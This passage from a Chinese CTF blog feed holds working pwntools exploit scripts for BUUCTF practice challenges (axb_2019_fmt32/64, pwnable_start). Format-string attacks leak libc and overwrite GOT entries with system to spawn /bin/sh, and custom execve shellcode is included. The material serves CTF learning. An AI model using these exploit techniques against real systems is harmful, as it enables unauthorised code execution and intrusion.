class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27454</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x0804867D')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>memset_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'memset'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%2$p'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">+=</span> <span class=\"token number\">0x23d</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of ret %#x'</span><span class=\"token operator\">%</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aaa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%75$s'</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#payload = b'aaaa'+b'%75$p'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>content<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%75$hn'</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">#assert len(payload) &lt;=6</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span><span class=\"token operator\">+</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>memset_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#payload = b'aaa'+fmtstr_payload(75,&#123;ret:sys_a&#125;, 12,'byte')</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"pwnable_start\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_start\">#</a> pwnable_start</h2>\n<p>ret2shellcode ret2syscall 汇编</p>\n<p>没有栈不可执行保护，所以选择 ret2shellcode，其次该程序很简洁，函数调用均使用系统调用。</p>\n<p>先泄露栈上地址。第一次返回后 esp 刚好指向一个栈地址。其次 write 系统调用的 buf 地址直接取当时的 esp。因此将返回地址修改到 write 前面，即可实现泄露地址。泄露的地址与 ret 后可输入的 buf 地址（即 ret 后 esp 地址）偏差为 cfdc-cfe0=4。（返回到 mov ecx, esp 处。因为 write 和 read 系统调用均已 ecx 为输入输出处，所以可控制栈内存起始处就是 esp 处。</p>\n<p><img data-src=\"./image-20230917173934650.png\" alt=\"image-20230917173934650\"></p>\n<p>由于只能输入 3c 个字符，0x14 处为返回地址，而之后仅剩 3c-14=0x28 个字节可输入，而 shellcode 有 2c 个字节，不够写。所以自己写一个 shellcode。</p>\n<p>在第一次输入时顺便写入 /bin/sh 字符，第二次构造 shellocde 时直接把第一次输入的地址传入 ebx 寄存器。地址与第二次 ret 后 esp 的偏差为 (0x14+0x4)*2=0x30。之后把 eax, ecx, edx 的值分别设置即可。</p>\n<pre><code class=\"language-assembly\">sub esp, 0x030; \nmov ebx, esp; \nxor ecx, ecx; \nxor edx, edx; \npush 0xb; \npop eax; \nint 0x80;\n</code></pre>\n<p>长度为 0xE</p>\n<p>完整代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./start')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b 0x08048087')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x014</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>tar1 <span class=\"token operator\">=</span> <span class=\"token number\">0x08048087</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>tar1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'CTF:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>addr1 <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>addr2 <span class=\"token operator\">=</span> addr1<span class=\"token operator\">-</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>assem<span class=\"token operator\">=</span><span class=\"token string\">'sub esp, 0x030; mov ebx, esp; xor ecx, ecx; xor edx, edx; push 0xb; pop eax; int 0x80;'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"-3\"><a class=\"markdownIt-Anchor\" href=\"#-3\">#</a> </h2>\n<h2 id=\"axb_2019_fmt64\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_fmt64\">#</a> axb_2019_fmt64</h2>\n<p>64 位为寄存器传参，第 7 位参数开始才放在栈上。</p>\n<p><img data-src=\"./image-20230919172840631.png\" alt=\"image-20230919172840631\"></p>\n<p>可控制的字符串位置为 db50（前一个有个冒号）栈上参数起始位置为 db40</p>\n<p>所以参数偏移为 6+(0xdb50 - 0xdb40)/0x8 = 0x8=8</p>\n<p>已填充字符个数为 9</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#=process('./axb_2019_fmt64')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29294</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#db.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%9$s'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一点是该程序里有个 sprintf 进行字符串转移，所以转移时会被’\\0’截断，并且切断后还会加个回车字符。所以地址只能取 s 变量处的而不能取 format 处的。之前 32 位程序代码几乎一样，但是我读取的是 format 处的字符串，所以迁移程序的时候卡了好久。</p>\n<p>这个程序迁移回 32 位就简单多了。</p>\n<h2 id=\"hitcontraining_magicheap\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_magicheap\">#</a> hitcontraining_magicheap</h2>\n",
            "tags": [
                "heap",
                "stack migration"
            ]
        },
        {
            "id": "http://waltcsz.github.io/PWN/%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%94%BB%E5%87%BB-89b5b4ffc084/",
            "url": "http://waltcsz.github.io/PWN/%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%94%BB%E5%87%BB-89b5b4ffc084/",
            "title": "堆攻击",
            "date_published": "2023-08-12T10:03:25.000Z",
            "content_html": "<h1 id=\"堆\"><a class=\"markdownIt-Anchor\" href=\"#堆\">#</a> 堆</h1>\n<h2 id=\"tcache\"><a class=\"markdownIt-Anchor\" href=\"#tcache\">#</a> tcache</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18y\">基本工作原理</span></p>\n<h2 id=\"小知识\"><a class=\"markdownIt-Anchor\" href=\"#小知识\">#</a> 小知识</h2>\n<p>calloc 会清空内存，而 malloc 不会</p>\n<pre><code class=\"language-c++\">calloc(0x20);\n//等同于\nptr=malloc(0x20);\nmemset(ptr,0,0x20);\n</code></pre>\n",
            "tags": [
                "heap"
            ]
        }
    ]
}